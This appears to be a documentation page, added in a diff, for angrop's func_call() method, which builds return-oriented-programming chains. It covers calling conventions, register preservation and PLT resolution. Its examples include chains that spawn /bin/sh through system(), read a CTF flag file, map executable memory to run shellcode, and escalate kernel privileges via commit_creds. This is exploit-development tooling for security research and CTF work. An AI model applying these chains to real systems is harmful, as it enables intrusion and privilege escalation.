@@ -1,0 +1,407 @@
+---
+title: Function Calls
+description: Call functions with arguments using angrop's automatic calling convention handling
+---
+
+Angrop provides the `func_call()` method to automatically generate ROP chains that invoke functions with proper calling conventions, argument setup, and optional return handling.
+
+## Basic Function Calls: `func_call()`
+
+The `func_call()` method handles all the complexity of setting up function arguments according to the target architecture's calling convention.
+
+### Method Signature
+
+```python
+rop.func_call(address, args, preserve_regs=None, needs_return=True)
+```
+
+**Parameters:**
+- `address`: Function address (integer) or name (string)
+- `args`: List or tuple of arguments to pass to the function
+- `preserve_regs`: Set of registers that should not be modified
+- `needs_return`: Whether execution should continue after the function (default: `True`)
+
+**Returns:** A `RopChain` that calls the function with the specified arguments
+
+### Basic Examples
+
+<Steps>
+  <Step title="Call a function by name">
+    ```python
+    import angr
+    import angrop
+
+    proj = angr.Project("/bin/bash")
+    rop = proj.analyses.ROP()
+    rop.find_gadgets()
+
+    # Call read(0, 0x804f000, 0x100)
+    chain = rop.func_call("read", [0, 0x804f000, 0x100])
+    chain.pp()
+    ```
+  </Step>
+
+  <Step title="Call a function by address">
+    ```python
+    # Call function at specific address
+    chain = rop.func_call(0x400560, [0x1234, 0x5678])
+    ```
+  </Step>
+
+  <Step title="Call without returning">
+    ```python
+    # Call system() and don't return (shorter chain)
+    chain = rop.func_call("system", [0x61b100], needs_return=False)
+    ```
+  </Step>
+</Steps>
+
+<Note>
+Angrop automatically detects the calling convention based on the architecture and platform. On x86_64 Linux, arguments go in `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then stack. On x86, arguments go on the stack.
+</Note>
+
+## Real-World Example: File Operations
+
+From angrop's Python API documentation:
+
+```python
+import os
+import angr
+import angrop
+
+proj = angr.Project("/bin/bash")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Build a chain that opens and reads a file
+chain = rop.write_to_mem(0x61b100, b"/home/ctf/flag\x00")
+chain += rop.func_call("open", [0x61b100, os.O_RDONLY])
+chain += rop.func_call("read", [0, 0x804f000, 0x100])
+# File descriptor from open() is implicitly used (in rax after open returns)
+```
+
+<Tip>
+When `needs_return=True`, angrop ensures the ROP chain continues executing after the function returns. Use `needs_return=False` for the final function call to generate shorter chains.
+</Tip>
+
+## Calling Convention Details
+
+### x86_64 (System V AMD64 ABI)
+
+Arguments are passed in registers:
+1. `rdi` - First argument
+2. `rsi` - Second argument  
+3. `rdx` - Third argument
+4. `rcx` - Fourth argument
+5. `r8` - Fifth argument
+6. `r9` - Sixth argument
+7. Stack - Additional arguments
+
+Return value in `rax`.
+
+```python
+# Example: read(fd, buf, count)
+chain = rop.func_call("read", [0, 0x804f000, 0x100])
+# Sets: rdi=0, rsi=0x804f000, rdx=0x100
+```
+
+### x86 (32-bit cdecl)
+
+All arguments passed on the stack in reverse order:
+
+```python
+# Example: read(fd, buf, count)
+chain = rop.func_call("read", [0, 0x804f000, 0x100])
+# Pushes: 0x100, 0x804f000, 0
+```
+
+Return value in `eax`.
+
+### ARM
+
+Arguments in `r0`, `r1`, `r2`, `r3`, then stack:
+
+```python
+# Sets: r0=arg1, r1=arg2, r2=arg3, r3=arg4
+chain = rop.func_call("function", [1, 2, 3, 4])
+```
+
+## Preserving Registers Across Calls
+
+Use `preserve_regs` to maintain register values across function calls:
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/bash")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Set rdi to a value
+chain = rop.set_regs(rdi=0x1000)
+
+# Call function without modifying rdi
+chain += rop.func_call("some_function", [0x2000], preserve_regs={'rdi'})
+
+# rdi is still 0x1000 after the call
+```
+
+### Real-World Example: Kernel Function Calls
+
+From angrop's kernel test suite (`solve.py:38-44`):
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("./vmlinux_sym")
+rop = proj.analyses.ROP(kernel_mode=True)
+rop.find_gadgets()
+
+init_cred = 0xffffffff8368b220
+init_nsproxy = 0xffffffff8368ad00
+
+# Chain multiple function calls with preserved registers
+chain = rop.func_call("commit_creds", [init_cred]) + \
+        rop.func_call("find_task_by_vpid", [1]) + \
+        rop.move_regs(rdi='rax') + \
+        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
+        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
+        rop.func_call('__x64_sys_fork', []) + \
+        rop.func_call('msleep', [0xffffffff])
+```
+
+This example shows:
+- Calling functions that return values (in `rax`)
+- Moving return values to argument registers
+- Preserving multiple registers across calls
+- Building complex multi-stage exploits
+
+<Note>
+When calling functions that return values, the result is typically in `rax` (x64) or `eax` (x86). Use `move_regs()` to move return values to other registers before the next call.
+</Note>
+
+## Using Function Return Values
+
+```python
+# Call a function that returns a value
+chain = rop.func_call("find_task_by_vpid", [1])
+# Return value is in rax
+
+# Move return value to rdi for next call
+chain += rop.move_regs(rdi='rax')
+
+# Use the return value as an argument
+chain += rop.func_call("process_task", [], preserve_regs={'rdi'})
+```
+
+## Calling Functions from PLT/GOT
+
+Angrop automatically resolves function names from the PLT (Procedure Linkage Table):
+
+```python
+# Angrop looks up "system" in PLT
+chain = rop.func_call("system", [0x61b100])
+
+# Equivalent to:
+system_plt = proj.loader.main_object.plt['system']
+chain = rop.func_call(system_plt, [0x61b100])
+```
+
+### How PLT/GOT Resolution Works
+
+From the source code (`func_caller.py:48-72`), angrop:
+
+1. Checks if the name exists in PLT
+2. Looks for the symbol in the binary
+3. Finds function pointers in GOT if available
+4. Searches for pointers to the function in readable segments
+
+<Tip>
+When calling library functions like `system`, `execve`, or `open`, use the string name rather than looking up addresses manually. Angrop handles all the resolution for you.
+</Tip>
+
+## Handling Stack Arguments
+
+For functions with more than 6 arguments on x86_64 (or any arguments on x86):
+
+```python
+# Function with 8 arguments on x86_64
+# First 6 in registers, last 2 on stack
+chain = rop.func_call("many_args", [
+    0x1,  # rdi
+    0x2,  # rsi
+    0x3,  # rdx
+    0x4,  # rcx
+    0x5,  # r8
+    0x6,  # r9
+    0x7,  # stack
+    0x8   # stack
+])
+```
+
+Angrop automatically:
+- Sets up register arguments
+- Pushes stack arguments
+- Aligns the stack properly
+- Handles cleanup if `needs_return=True`
+
+## Advanced: Direct Register Control
+
+From angrop's Python API documentation (`pythonapi.md:101-111`), you can use registers directly as arguments:
+
+```python
+# Tell angrop to use whatever value is already in rdi
+chain = rop.func_call("prepare_kernel_cred", 
+                     (0x41414141, 0x42424242), 
+                     preserve_regs={'rdi'})
+chain.pp()
+```
+
+Output:
+```
+0xffffffff81489752: pop rsi; ret 
+                    0x42424242
+0xffffffff8114d660: <prepare_kernel_cred>
+                    <BV64 next_pc_4280_64>
+```
+
+By using `preserve_regs={'rdi'}`, angrop skips setting `rdi` and uses whatever value is already there (e.g., from a previous function's return value).
+
+## Calling Functions Without Returning
+
+When you don't need to return from a function, set `needs_return=False`:
+
+```python
+# Final call in exploit - no need to return
+chain = rop.write_to_mem(0x61b100, b"/bin/sh\x00")
+chain += rop.func_call("system", [0x61b100], needs_return=False)
+
+# Or use execve which never returns anyway
+chain = rop.execve()  # Implicitly sets needs_return=False
+```
+
+<Note>
+Setting `needs_return=False` generates shorter chains because angrop doesn't need to set up stack frames for returning to the ROP chain. Use this for the last function call in your exploit.
+</Note>
+
+## Common Function Call Patterns
+
+### Pattern 1: Open-Read-Write
+
+```python
+import os
+
+# Open file
+chain = rop.write_to_mem(0x61b100, b"flag.txt\x00")
+chain += rop.func_call("open", [0x61b100, os.O_RDONLY])
+
+# Read contents (fd is in rax from open)
+chain += rop.move_regs(rdi='rax')
+chain += rop.func_call("read", [], preserve_regs={'rdi'})
+chain += rop.set_regs(rsi=0x61b200, rdx=0x100, preserve_regs={'rdi'})
+
+# Write to stdout
+chain += rop.func_call("write", [1, 0x61b200, 0x100])
+```
+
+### Pattern 2: Allocate-Write-Execute
+
+```python
+from ctypes import PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANONYMOUS
+
+# Allocate rwx memory
+chain = rop.func_call("mmap", [
+    0,  # addr
+    0x1000,  # length
+    PROT_READ | PROT_WRITE | PROT_EXEC,  # prot
+    MAP_PRIVATE | MAP_ANONYMOUS,  # flags
+    -1,  # fd
+    0   # offset
+])
+
+# Write shellcode to allocated memory
+chain += rop.move_regs(rbx='rax')
+chain += rop.write_to_mem('rbx', shellcode, preserve_regs={'rbx'})
+
+# Jump to shellcode
+chain += rop.move_regs(rax='rbx')
+# Use jmp rax gadget or call rax
+```
+
+### Pattern 3: Chain Library Calls
+
+```python
+# Disable ASLR (if possible)
+chain = rop.func_call("personality", [0xffffffff])
+
+# Set up alarm
+chain += rop.func_call("alarm", [0])
+
+# Finally execute shell
+chain += rop.write_to_mem(0x61b100, b"/bin/sh\x00")
+chain += rop.func_call("system", [0x61b100], needs_return=False)
+```
+
+## Troubleshooting
+
+### "Symbol does not exist" Error
+
+```python
+try:
+    chain = rop.func_call("nonexistent", [0x1234])
+except angrop.errors.RopException as e:
+    print(f"Function not found: {e}")
+    # Use address directly or different function
+```
+
+### "Fail to invoke function" Error
+
+This occurs when angrop can't find suitable gadgets:
+
+<Tip>
+**Solutions:**
+1. Ensure `find_gadgets(optimize=True)` was called
+2. Try `needs_return=False` if you don't need to return
+3. Check if required registers can be set
+4. Verify the function address is correct
+5. Consider using `do_syscall()` instead of library functions
+</Tip>
+
+### Return Value Not Preserved
+
+If you need to use a function's return value:
+
+```python
+# WRONG: Return value in rax will be clobbered
+chain = rop.func_call("get_value", [])
+chain += rop.func_call("use_value", [0x1234])  # Lost the return value!
+
+# CORRECT: Move return value before next operation
+chain = rop.func_call("get_value", [])
+chain += rop.move_regs(rdi='rax')  # Save return value
+chain += rop.func_call("use_value", [], preserve_regs={'rdi'})
+```
+
+## Best Practices
+
+1. **Use function names** when possible instead of hardcoded addresses
+2. **Set `needs_return=False`** for the final call to reduce chain size
+3. **Preserve return values** by moving them before subsequent operations
+4. **Use `preserve_regs`** when you need to maintain state across calls
+5. **Test incrementally** - build and test each function call before chaining
+6. **Check calling conventions** for your target architecture
+
+## Performance Tips
+
+- Function calls without returns are faster to generate
+- Preserving many registers increases constraint complexity
+- Using stack arguments adds overhead
+- PLT/GOT calls may be more efficient than direct addresses
+
+## Next Steps
+
+- [Syscalls](/guides/syscalls) - Make system calls instead of library calls
+- [Register Operations](/guides/register-operations) - Manually set up arguments
+- [Memory Operations](/guides/memory-operations) - Prepare data for function calls
